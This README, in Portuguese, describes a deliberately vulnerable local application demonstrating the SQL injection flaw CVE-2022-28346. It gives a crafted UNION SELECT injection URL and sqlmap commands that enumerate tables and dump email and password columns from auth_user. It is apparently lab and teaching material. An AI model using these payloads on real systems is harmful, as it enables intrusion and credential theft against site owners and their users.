# Aplicação Vulnerável ao CVE-2022-28346

Este projeto demonstra uma aplicação vulnerável ao [CVE-2022-28346](https://nvd.nist.gov/vuln/detail/CVE-2022-28346), permitindo a exploração de SQL Injection.

## Instalação do sqlmap

Para realizar os testes, instale o [sqlmap](https://sqlmap.org/) com o comando:

```bash
sudo snap install sqlmap
```

## Prova de Conceito (PoC)

Abaixo estão exemplos de exploração utilizando sqlmap e uma URL vulnerável:

### URL de Teste

```
http://127.0.0.1:8000/poc?field=poc.title%22%20FROM%20%22core_blog%22%20union%20SELECT%20%22-1,%22,sqlite_version(),%223%22%22--
```

### Comandos sqlmap

- **Detectar vulnerabilidade:**
    ```bash
    sqlmap "http://127.0.0.1:8000/poc?field=poc.title%22%20FROM%20%22core_blog%22%20union%20SELECT%20%22-1,%22,sqlite_version(),%223%22%22--" -p field --risk=3 --level=5
    ```

- **Listar tabelas do banco de dados:**
    ```bash
    sqlmap "http://127.0.0.1:8000/poc?field=poc.title%22%20FROM%20%22core_blog%22%20union%20SELECT%20%22-1,%22,sqlite_version(),%223%22%22--" -p field --risk=3 --level=5 --tables
    ```

- **Listar colunas da tabela `auth_user`:**
    ```bash
    sqlmap "http://127.0.0.1:8000/poc?field=poc.title%22%20FROM%20%22core_blog%22%20union%20SELECT%20%22-1,%22,sqlite_version(),%223%22%22--" -p field --risk=3 --level=5 -T auth_user --columns
    ```

- **Extrair dados das colunas `email`, `first_name` e `password` da tabela `auth_user`:**
    ```bash
    sqlmap "http://127.0.0.1:8000/poc?field=poc.title%22%20FROM%20%22core_blog%22%20union%20SELECT%20%22-1,%22,sqlite_version(),%223%22%22--" -p field --risk=3 --level=5 -T auth_user -C email,first_name,password --dump
    ```

> **Atenção:** Este material é apenas para fins educacionais e deve ser utilizado em ambientes controlados.

